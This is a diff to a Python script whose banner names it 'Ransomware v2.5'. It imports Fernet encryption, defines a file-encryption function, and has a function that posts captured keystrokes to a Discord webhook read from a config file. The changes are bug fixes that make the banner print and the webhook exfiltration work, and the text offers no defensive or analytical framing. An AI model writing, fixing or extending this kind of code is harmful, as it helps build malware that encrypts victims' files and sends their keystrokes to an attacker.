@@ -5,7 +5,7 @@ from cryptography.fernet import Fernet
 import requests
 import configparser
 
-print('''
+print(r'''
 ,-.                                         
 |  )                                        
 |-<  ,-: ;-. ,-. ,-. ;-.-. , , , ,-: ;-. ,-.
@@ -13,7 +13,8 @@ print('''
 '  ' `-` ' ' `-' `-' ' ' ' ' '   `-` '   `-'
 v2.5
 Copyright: @ALHARAM 
-'''
+''')
+
 # Load configuration from config.conf
 config = configparser.ConfigParser()
 config.read('config.conf')
@@ -23,7 +24,7 @@ WEBHOOK_URL = config['settings']['webhook_url']
 # Function to send keystrokes to Discord via webhook
 def send_to_discord(message):
     data = {'content': message}
-    requests.post(DISCORD_WEBHOOK_URL, data=data)
+    requests.post(WEBHOOK_URL, data=data)
 
 
 def encrypt_file(file, cipher):
